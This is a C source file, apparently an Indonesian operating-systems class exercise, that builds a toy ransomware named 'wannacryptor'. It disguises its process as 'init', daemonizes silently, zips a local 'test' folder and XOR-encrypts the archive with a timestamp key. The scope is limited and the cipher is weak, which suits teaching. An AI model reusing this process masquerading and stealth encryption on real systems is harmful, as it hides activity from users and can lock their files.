#define _GNU_SOURCE
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <miniz/miniz.h>
#include <time.h>
#include <dirent.h>

// test folder untuk wannacryptor
// https://drive.google.com/file/d/12COBJZHO3orgy8LYCVOIVr0DPvI0Twzy/view?usp=sharing

// https://github.com/richgel999/miniz
// Untuk melakukan zip, saya menemukan resource yang menarik dan mencoba menggunakannya.

void zip_folder_recursive(mz_zip_archive *zip, const char *base_path, const char *folder_path) {
    DIR *dir = opendir(folder_path);
    if (!dir) {
        perror("opendir");
        return;
    }

    struct dirent *entry;
    char path[2048];
    char relative_path[1024];

    while ((entry = readdir(dir)) != NULL) {
        // ngeskip . sama .. di folder
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", folder_path, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) {
            perror("stat");
            continue;
        }

        snprintf(relative_path, sizeof(relative_path), "%s/%s",
                 base_path, entry->d_name);

        if (S_ISDIR(st.st_mode)) {
            char dir_name[2048];
            snprintf(dir_name, sizeof(dir_name), "%s/", relative_path);
            mz_zip_writer_add_mem(zip, dir_name, NULL, 0, MZ_DEFAULT_COMPRESSION);

            zip_folder_recursive(zip, relative_path, path);
        } else {
            FILE *f = fopen(path, "rb");
            if (!f) {
                perror("fopen");
                continue;
            }
            fseek(f, 0, SEEK_END);
            size_t size = ftell(f);
            rewind(f);

            void *data = malloc(size);
            fread(data, 1, size, f);
            fclose(f);

            mz_zip_writer_add_mem(zip, relative_path, data, size, MZ_BEST_COMPRESSION);
            free(data);
        }
    }

    closedir(dir);
}

void zip_folder(const char *root_folder, const char *zip_path) {
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));

    if (!mz_zip_writer_init_file(&zip, zip_path, 0)) {
        printf("Could not create zip file\n");
        return;
    }

    zip_folder_recursive(&zip, root_folder, root_folder);

    mz_zip_writer_finalize_archive(&zip);
    mz_zip_writer_end(&zip);
    printf("Successfully zipped folder: %s -> %s\n", root_folder, zip_path);
}

long get_timestamp() {
    FILE *fptr = fopen("timestamp.txt", "w");
    if (fptr == NULL) {
        printf("Error opening file for writing!\n");
        return 0;
    }

    time_t timestamp = time(NULL);
    if (timestamp == (time_t)-1) {
        perror("time");
        fclose(fptr);
        return 0;
    }

    fprintf(fptr, "%ld", timestamp);
    fclose(fptr);
    return timestamp;
}


// https://gist.github.com/DreamVB/6e89f0fca978b703d885ed1ead112c78
// inspired dari gist diatas untuk fungsi encryptor
void wannacryptor() {
    long timestamp = get_timestamp();
    if (timestamp == 0) return;

    FILE *zipfile = fopen("test.zip", "rb");
    if (zipfile == NULL) {
        printf("Error opening test.zip\n");
        return;
    }

    FILE *encrypted = fopen("test.zip.enc", "wb");
    if (encrypted == NULL) {
        printf("Error opening test.zip.enc\n");
        fclose(zipfile);
        return;
    }

    unsigned char buffer;
    unsigned char *key = (unsigned char *)&timestamp;
    int i = 0;

    printf("Encrypting process start...\n");
    while (fread(&buffer, 1, 1, zipfile)) {
        buffer ^= key[i % sizeof(long)];
        fwrite(&buffer, 1, 1, encrypted);
        i++;
    }

    printf("encryptor executed perfectly\n");
    fclose(zipfile);
    fclose(encrypted);
}

void soalB() {
    pid_t wannacry = fork();

    if (wannacry < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    if (wannacry > 0) {
        printf("something running behind your computer\n");
        exit(EXIT_SUCCESS);
    }

    umask(0);

    if (setsid() < 0) {
        perror("setsid failed");
        exit(EXIT_FAILURE);
    }

    wannacry = fork();
    if (wannacry < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    if (wannacry > 0) {
        exit(EXIT_SUCCESS);
    }
    
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        // balik ke working directory jaga jaga biar semua vm ga ke encrypt wkwkwkwk
        chdir(cwd);
    } else {
        perror("getcwd failed");
    }

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    zip_folder("test", "test.zip");
    wannacryptor();
}


int main(int argc, char **argv) {
    // Kamuflase main jadi init, soal A
    strncpy(argv[0], "init", strlen(argv[0]));
    memset(argv[0] + 4, '\0', strlen(argv[0]) - 4);
    prctl(PR_SET_NAME, "init", 0, 0, 0);

    soalB();
    return 0;
}

